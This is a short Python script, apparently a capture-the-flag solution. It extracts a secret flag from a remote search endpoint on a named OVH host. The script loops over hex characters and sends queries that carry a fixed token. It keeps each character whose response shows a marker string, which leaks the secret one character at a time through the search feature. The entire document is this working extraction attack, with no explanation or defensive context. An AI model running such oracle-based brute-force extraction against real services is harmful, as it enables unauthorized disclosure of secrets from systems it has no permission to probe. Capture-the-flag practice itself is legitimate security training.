import requests
import string

url = 'http://vps595401.ovh.net:36822/search'

flag = 'flag{'
was = True
while was:
    was = False
    for c in string.hexdigits:
        r = requests.get(url, params={'q': flag + c, 's': 'ead8528b5bd3507b6c8efca41ecf918c'})
        if 'Super Hacker Secret Flag 1337' in r.text:
            flag += c
            was = True
            break
    if not was:
        flag += '}'
    print(flag)